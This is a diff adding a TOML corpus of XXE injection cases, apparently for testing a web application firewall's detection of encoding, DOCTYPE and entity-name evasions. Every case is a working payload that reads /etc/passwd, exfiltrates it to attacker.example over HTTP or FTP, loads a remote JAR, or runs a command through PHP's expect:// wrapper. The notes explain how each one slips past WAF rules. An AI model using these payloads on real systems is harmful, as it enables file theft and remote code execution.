@@ -1,0 +1,106 @@
+schema = 1
+# XXE injection — encoding / declaration evasion variants. WAFs
+# typically match on the literal `<!DOCTYPE` or `<!ENTITY` tokens
+# in raw bytes; these variants survive that check via XML's
+# documented encoding declaration + parameter-entity machinery.
+
+# ── XML encoding declaration variants ──
+
+[[case]]
+id = "encoding_utf16le_bom"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+description = "UTF-16 encoding declaration — parser may switch byte order  interpretation; rules matching UTF-8 bytes don't fire on  a UTF-16-claimed body"
+
+[[case]]
+id = "encoding_us_ascii_quirk"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\" encoding=\"US-ASCII\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+description = "US-ASCII declaration — some parsers reject high-bit; some  accept and silently switch encoding handlers"
+
+[[case]]
+id = "encoding_ibm500_ebcdic"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\" encoding=\"IBM500\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+description = "IBM500 EBCDIC declaration — parsers that honour exotic  encodings may decode wrongly; WAF byte-matchers don't  track encoding"
+
+# ── DOCTYPE whitespace / case folding ──
+
+[[case]]
+id = "doctype_with_extra_whitespace"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE  foo  [<!ENTITY  xxe  SYSTEM  \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+description = "Extra whitespace inside DOCTYPE — XML says any whitespace  is fine; literal-string WAFs miss the variant"
+
+[[case]]
+id = "doctype_with_inline_comment"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo <!-- benign --> [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+description = "XML comment between DOCTYPE name and the entity subset —  rule corpora rarely tolerate inline comments"
+
+[[case]]
+id = "doctype_mixed_case_keywords"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!doctype foo [<!entity xxe system \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+description = "DOCTYPE / ENTITY / SYSTEM keywords lowercased — XML is  case-sensitive but some parsers (especially HTML-leaning  like libxml's HTML mode) accept either"
+
+# ── Parameter entity OOB exfil chains ──
+
+[[case]]
+id = "pe_chain_local_dtd_exfil"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.example/x.dtd\">%dtd;]><foo>&exfil;</foo>"
+description = "Parameter-entity chain that fetches an attacker DTD which  then exfils local file contents via a callback URL"
+
+[[case]]
+id = "pe_chain_ftp_oob"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % oob \"<!ENTITY exfil SYSTEM 'ftp://attacker.example/%file;'>\">%oob;]><foo>&exfil;</foo>"
+description = "FTP-based OOB exfil (legacy but still works against older  Java/.NET parsers); FTP is rarely WAF-inspected"
+
+# ── External entity URL-scheme variants ──
+
+[[case]]
+id = "external_jar_scheme_java"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:http://attacker.example/x.jar!/x.txt\">]><foo>&xxe;</foo>"
+description = "jar: URL scheme — Java's URLClassLoader supports;  attacker controls remote JAR contents"
+
+[[case]]
+id = "external_netdoc_scheme_java"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"netdoc:/etc/passwd\">]><foo>&xxe;</foo>"
+description = "netdoc: scheme — older Java URL handlers expose local  filesystem; not in most WAF blocklists"
+
+[[case]]
+id = "external_expect_php_filter"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>"
+description = "expect:// scheme — PHP's expect wrapper for command  execution; turns XXE into RCE when present"
+
+# ── Entity-name obfuscation ──
+
+[[case]]
+id = "entity_name_unicode_letter"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY éxfil SYSTEM \"file:///etc/passwd\">]><foo>&éxfil;</foo>"
+description = "Entity name uses non-ASCII letter (é) — XML allows;  literal-name WAF rules don't match"
+
+[[case]]
+id = "entity_name_underscore_prefix"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY _xxe SYSTEM \"file:///etc/passwd\">]><foo>&_xxe;</foo>"
+description = "Underscore-prefixed entity name — valid XML, deviates  from the canonical `xxe` token most rule corpora pin"
